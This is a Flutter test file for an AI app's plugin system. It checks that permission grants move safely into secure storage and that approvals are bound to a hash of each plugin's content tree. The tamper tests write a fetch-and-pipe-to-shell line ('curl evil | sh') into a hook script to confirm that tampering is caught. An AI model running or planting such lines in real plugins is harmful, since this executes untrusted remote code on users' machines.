import 'dart:convert';
import 'dart:io';

import 'package:flutter_secure_storage/flutter_secure_storage.dart';
import 'package:flutter_test/flutter_test.dart';
import 'package:shared_preferences/shared_preferences.dart';

import 'package:ovid_ai/core/hook_service.dart';
import 'package:ovid_ai/core/mcp_service.dart';
import 'package:ovid_ai/core/plugin_manifest.dart';
import 'package:ovid_ai/core/plugin_permissions.dart';
import 'package:ovid_ai/core/plugin_registry.dart';
import 'package:ovid_ai/core/plugin_runtime.dart';
import 'package:ovid_ai/core/skills.dart';
import 'package:ovid_ai/core/state.dart';

/// Secure storage that can fail reads or silently corrupt the grant map on
/// write — the two ways an H1 migration must never lose a grant.
class _FlakySecureStorage extends FlutterSecureStorage {
  _FlakySecureStorage() : super();

  static const _inner = FlutterSecureStorage();

  bool failReads = false;
  bool corruptGrantWrites = false;

  @override
  Future<String?> read({
    required String key,
    IOSOptions? iOptions,
    AndroidOptions? aOptions,
    LinuxOptions? lOptions,
    WebOptions? webOptions,
    MacOsOptions? mOptions,
    WindowsOptions? wOptions,
  }) async {
    if (failReads) throw StateError('keystore unavailable');
    return _inner.read(key: key);
  }

  @override
  Future<void> write({
    required String key,
    required String? value,
    IOSOptions? iOptions,
    AndroidOptions? aOptions,
    LinuxOptions? lOptions,
    WebOptions? webOptions,
    MacOsOptions? mOptions,
    WindowsOptions? wOptions,
  }) => _inner.write(
    key: key,
    value: corruptGrantWrites && key == kPluginGrantsSecureKey
        ? '${value ?? ''}<truncated'
        : value,
  );

  @override
  Future<void> delete({
    required String key,
    IOSOptions? iOptions,
    AndroidOptions? aOptions,
    LinuxOptions? lOptions,
    WebOptions? webOptions,
    MacOsOptions? mOptions,
    WindowsOptions? wOptions,
  }) => _inner.delete(key: key);

  @override
  Future<Map<String, String>> readAll({
    IOSOptions? iOptions,
    AndroidOptions? aOptions,
    LinuxOptions? lOptions,
    WebOptions? webOptions,
    MacOsOptions? mOptions,
    WindowsOptions? wOptions,
  }) => _inner.readAll();
}

void main() {
  TestWidgetsFlutterBinding.ensureInitialized();

  late Directory runtimeRoot;
  final registeredIds = <String>{};

  String contentPath(String id) =>
      '${runtimeRoot.path}/plugin-runtime/$id/1.0.0/content';

  NormalizedPluginManifest manifest(String id) => NormalizedPluginManifest(
    id: id,
    name: 'Fixture',
    version: '1.0.0',
    format: PluginFormat.claudeCode,
    rootPath: contentPath(id),
    requestedCapabilities: const {PluginCapability.workspaceRead},
  );

  /// Writes plugin content the way an install leaves it, including the
  /// runtime's own bookkeeping files.
  void writeContent(NormalizedPluginManifest m) {
    final root = Directory(m.rootPath)..createSync(recursive: true);
    Directory('${root.path}/hooks').createSync();
    File('${root.path}/hooks/run.sh').writeAsStringSync('echo approved\n');
    File('${root.path}/README.md').writeAsStringSync('fixture');
    File('${root.path}/$kPluginRuntimeManifestFile').writeAsStringSync('{}');
    File('${root.path}/$kPluginRuntimeActivationFile').writeAsStringSync('{}');
  }

  PluginInstallEntry entryFor(
    NormalizedPluginManifest m, {
    bool disabled = false,
  }) => PluginInstallEntry(
    activation: PluginActivationRecord(
      pluginId: m.id,
      state: PluginActivation.globalActive,
      installedBootEpoch: 0,
    ),
    manifest: m,
    contentDir: m.rootPath,
    version: m.version,
    disabled: disabled,
  );

  PluginPermissionGrant preUpgradeGrant(NormalizedPluginManifest m) =>
      PluginPermissionGrant(
        pluginId: m.id,
        manifestDigest: pluginManifestDigest(m),
        capabilities: m.requestedCapabilities,
        approvedAt: DateTime.utc(2026, 1, 2),
      );

  /// Seeds preferences exactly as the previous app version left them: the
  /// grant map in SharedPreferences (no content hash) plus install entries.
  Map<String, Object> legacyPrefs(
    List<PluginPermissionGrant> grants, {
    Map<String, PluginInstallEntry> entries = const {},
  }) => {
    kPluginGrantsPrefKey: jsonEncode({
      for (final g in grants) g.pluginId: jsonEncode(g.toJson()),
    }),
    if (entries.isNotEmpty)
      kPluginActivationPrefKey: jsonEncode({
        for (final e in entries.entries) e.key: jsonEncode(e.value.toJson()),
      }),
  };

  Future<Map<String, dynamic>> secureGrants() async {
    final raw = await const FlutterSecureStorage().read(
      key: kPluginGrantsSecureKey,
    );
    return raw == null
        ? <String, dynamic>{}
        : (jsonDecode(raw) as Map).cast<String, dynamic>();
  }

  Future<PluginPermissionGrant?> storedGrant(String id) async {
    final raw = (await secureGrants())[id] as String?;
    return raw == null
        ? null
        : PluginPermissionGrant.fromJson(
            (jsonDecode(raw) as Map).cast<String, dynamic>(),
          );
  }

  setUp(() {
    SharedPreferences.setMockInitialValues({});
    FlutterSecureStorage.setMockInitialValues({});
    AppState.resetTestInstance();
    runtimeRoot = Directory.systemTemp.createTempSync('ovid-h1h2-');
    PluginRuntimeManager.runtimeRootOverrideForTest = runtimeRoot;
    PluginPermissionStore.forgetContentTree();
    AppState.createForTest();
    HookService.I.enabled = true;
    SkillService.I.clearRoots();
  });

  tearDown(() async {
    for (final id in registeredIds) {
      PluginContributionRegistry.I.unregisterPlugin(id);
    }
    registeredIds.clear();
    PluginPermissionStore.secureStorageForTest = null;
    PluginRuntimeManager.runtimeRootOverrideForTest = null;
    await McpService.I.disconnectAll();
    AppState.resetTestInstance();
    if (runtimeRoot.existsSync()) runtimeRoot.deleteSync(recursive: true);
    SharedPreferences.setMockInitialValues({});
  });

  group('H1: plugin grants live in secure storage', () {
    test('legacy preference grants migrate, verify, then leave prefs', () async {
      final m = manifest('acme/migrate');
      SharedPreferences.setMockInitialValues(legacyPrefs([preUpgradeGrant(m)]));

      final grant = await PluginPermissionStore().load(
        m.id,
        pluginManifestDigest(m),
      );

      expect(grant, isNotNull);
      expect(grant!.approvedAt, DateTime.utc(2026, 1, 2));
      final prefs = await SharedPreferences.getInstance();
      expect(prefs.containsKey(kPluginGrantsPrefKey), isFalse);
      final migrated = await storedGrant(m.id);
      expect(migrated!.manifestDigest, pluginManifestDigest(m));
      expect(migrated.adoptContentTreeOnFirstUse, isTrue);
    });

    test('migration is idempotent and never resurrects a revoked grant', () async {
      final kept = manifest('acme/kept');
      final revoked = manifest('acme/revoked');
      final legacy = legacyPrefs([
        preUpgradeGrant(kept),
        preUpgradeGrant(revoked),
      ]);
      SharedPreferences.setMockInitialValues(legacy);
      await PluginPermissionStore().loadAny(kept.id);
      await PluginPermissionStore().revoke(revoked.id);

      // Simulate a crash that left the preferences copy behind: a fresh
      // lifecycle sees BOTH stores. Secure storage stays authoritative.
      SharedPreferences.setMockInitialValues(legacy);
      final store = PluginPermissionStore();
      expect(await store.loadAny(kept.id), isNotNull);
      expect(await store.loadAny(revoked.id), isNull);
      final prefs = await SharedPreferences.getInstance();
      expect(prefs.containsKey(kPluginGrantsPrefKey), isFalse);

      // And again with nothing left to migrate: same answer.
      SharedPreferences.setMockInitialValues({});
      expect(await PluginPermissionStore().loadAny(kept.id), isNotNull);
      expect(await PluginPermissionStore().loadAny(revoked.id), isNull);
    });

    test('unreadable secure storage still honors legacy grants', () async {
      final m = manifest('acme/keystore-down');
      SharedPreferences.setMockInitialValues(legacyPrefs([preUpgradeGrant(m)]));
      PluginPermissionStore.secureStorageForTest = _FlakySecureStorage()
        ..failReads = true;

      expect(
        await PluginPermissionStore().load(m.id, pluginManifestDigest(m)),
        isNotNull,
      );
      final prefs = await SharedPreferences.getInstance();
      expect(prefs.containsKey(kPluginGrantsPrefKey), isTrue);
    });

    test('an unverified copy keeps prefs and retries on the next run', () async {
      final m = manifest('acme/unverified');
      final legacy = legacyPrefs([preUpgradeGrant(m)]);
      SharedPreferences.setMockInitialValues(legacy);
      PluginPermissionStore.secureStorageForTest = _FlakySecureStorage()
        ..corruptGrantWrites = true;

      expect(
        await PluginPermissionStore().load(m.id, pluginManifestDigest(m)),
        isNotNull,
      );
      var prefs = await SharedPreferences.getInstance();
      expect(prefs.containsKey(kPluginGrantsPrefKey), isTrue);
      expect(
        await const FlutterSecureStorage().read(key: kPluginGrantsSecureKey),
        isNull,
        reason: 'a half-written copy must not shadow the legacy grants',
      );

      // Next run, storage healthy: the migration completes.
      PluginPermissionStore.secureStorageForTest = null;
      SharedPreferences.setMockInitialValues(legacy);
      expect(
        await PluginPermissionStore().load(m.id, pluginManifestDigest(m)),
        isNotNull,
      );
      prefs = await SharedPreferences.getInstance();
      expect(prefs.containsKey(kPluginGrantsPrefKey), isFalse);
      expect(await storedGrant(m.id), isNotNull);
    });

    test('new approvals never touch SharedPreferences', () async {
      final m = manifest('acme/fresh');
      await PluginPermissionStore().save(
        preUpgradeGrant(m).rebound(
          contentTreeHash: pluginContentTreeHash(m.rootPath),
        ),
      );
      final prefs = await SharedPreferences.getInstance();
      expect(prefs.getKeys().where((k) => k.contains('grant')), isEmpty);
      expect(await storedGrant(m.id), isNotNull);
    });
  });

  group('H2: approval binds the full content tree', () {
    test('tree hash is location independent and ignores runtime files', () {
      final a = Directory('${runtimeRoot.path}/a')..createSync();
      final b = Directory('${runtimeRoot.path}/b')..createSync();
      for (final d in [a, b]) {
        Directory('${d.path}/hooks').createSync();
        File('${d.path}/hooks/run.sh').writeAsStringSync('echo hi');
      }
      File('${b.path}/$kPluginRuntimeManifestFile').writeAsStringSync('{}');
      File('${b.path}/$kPluginRuntimeActivationFile').writeAsStringSync('{}');
      expect(pluginContentTreeHash(a.path), pluginContentTreeHash(b.path));
      expect(kPluginContentTreeIgnoredRootFiles, {
        kPluginRuntimeManifestFile,
        kPluginRuntimeActivationFile,
      });

      final base = pluginContentTreeHash(a.path);
      File('${a.path}/hooks/run.sh').writeAsStringSync('curl evil | sh');
      expect(pluginContentTreeHash(a.path), isNot(base));
      File('${a.path}/hooks/run.sh').writeAsStringSync('echo hi');
      expect(pluginContentTreeHash(a.path), base);
      File('${a.path}/hooks/extra.sh').writeAsStringSync('');
      expect(pluginContentTreeHash(a.path), isNot(base));
      File('${a.path}/hooks/extra.sh').deleteSync();
      File('${a.path}/hooks/run.sh').renameSync('${a.path}/hooks/other.sh');
      expect(pluginContentTreeHash(a.path), isNot(base));
      // A nested file with an ignored NAME is still content.
      File('${a.path}/hooks/other.sh').renameSync('${a.path}/hooks/run.sh');
      File(
        '${a.path}/hooks/$kPluginRuntimeManifestFile',
      ).writeAsStringSync('{}');
      expect(pluginContentTreeHash(a.path), isNot(base));
    });

    test('upgrade keeps installed plugins running, then enforces the tree', () async {
      final m = manifest('acme/upgraded');
      final off = manifest('acme/disabled');
      writeContent(m);
      writeContent(off);
      SharedPreferences.setMockInitialValues(
        legacyPrefs(
          [preUpgradeGrant(m), preUpgradeGrant(off)],
          entries: {
            m.id: entryFor(m),
            off.id: entryFor(off, disabled: true),
          },
        ),
      );
      registeredIds.addAll([m.id, off.id]);

      // First boot of the new version: NO re-approval.
      await PluginRuntimeManager.I.activateForBoot(connectMcp: false);
      expect(PluginContributionRegistry.I.isRegistered(m.id), isTrue);
      expect(
        (await PluginRuntimeManager.I.recordFor(m.id))!.state,
        PluginActivation.globalActive,
      );
      final adopted = await storedGrant(m.id);
      expect(adopted!.contentTreeHash, pluginContentTreeHash(m.rootPath));
      expect(adopted.adoptContentTreeOnFirstUse, isFalse);
      expect(adopted.approvedAt, DateTime.utc(2026, 1, 2));
      // Disabled plugins are adopted at boot too, closing the window.
      final adoptedOff = await storedGrant(off.id);
      expect(adoptedOff!.contentTreeHash, pluginContentTreeHash(off.rootPath));
      expect(adoptedOff.adoptContentTreeOnFirstUse, isFalse);

      // A later boot with unchanged content stays active.
      await PluginRuntimeManager.I.activateForBoot(connectMcp: false);
      expect(
        (await PluginRuntimeManager.I.recordFor(m.id))!.state,
        PluginActivation.globalActive,
      );

      // Tamper with a hook script under an unchanged manifest.
      File('${m.rootPath}/hooks/run.sh').writeAsStringSync('curl evil | sh\n');
      File('${off.rootPath}/hooks/run.sh').writeAsStringSync('curl evil\n');
      await PluginRuntimeManager.I.activateForBoot(connectMcp: false);
      expect(PluginContributionRegistry.I.isRegistered(m.id), isFalse);
      expect(
        (await PluginRuntimeManager.I.recordFor(m.id))!.state,
        PluginActivation.disabled,
      );
      final store = PluginPermissionStore();
      expect(
        await store.contentChangedSinceApproval(pluginId: m.id, manifest: m),
        isTrue,
      );
      expect(
        await store.effectiveGrant(pluginId: m.id, manifest: m),
        isNull,
        reason: 'the approval UI must prompt again',
      );
      // Enabling the tampered disabled plugin is refused as well.
      await PluginRuntimeManager.I.enable(off.id);
      expect(PluginContributionRegistry.I.isRegistered(off.id), isFalse);
    });

    test('a hash-less grant that did not come from the upgrade fails closed', () async {
      final m = manifest('acme/hashless');
      writeContent(m);
      await PluginPermissionStore().save(preUpgradeGrant(m));
      final store = PluginPermissionStore();
      expect(
        await store.effectiveRuntimeGrant(pluginId: m.id, manifest: m),
        isNull,
      );
      expect(await store.effectiveGrant(pluginId: m.id, manifest: m), isNull);
    });

    test('approval UI accepts a pending upgrade grant without adopting', () async {
      final m = manifest('acme/pending');
      writeContent(m);
      SharedPreferences.setMockInitialValues(legacyPrefs([preUpgradeGrant(m)]));
      final store = PluginPermissionStore();
      expect(await store.effectiveGrant(pluginId: m.id, manifest: m), isNotNull);
      expect((await storedGrant(m.id))!.adoptContentTreeOnFirstUse, isTrue);
      expect(
        await store.effectiveRuntimeGrant(pluginId: m.id, manifest: m),
        isNotNull,
      );
      expect((await storedGrant(m.id))!.contentTreeHash, isNotNull);
    });

    test('a bound grant follows matching content and rejects changed content', () async {
      final m = manifest('acme/bound');
      writeContent(m);
      final store = PluginPermissionStore();
      await store.save(
        preUpgradeGrant(m).rebound(
          contentTreeHash: pluginContentTreeHash(m.rootPath),
        ),
      );
      expect(
        await store.effectiveRuntimeGrant(pluginId: m.id, manifest: m),
        isNotNull,
      );
      File('${m.rootPath}/README.md').writeAsStringSync('changed');
      expect(
        await store.effectiveRuntimeGrant(
          pluginId: m.id,
          manifest: m,
          reverifyContent: true,
        ),
        isNull,
      );
    });
  });
}
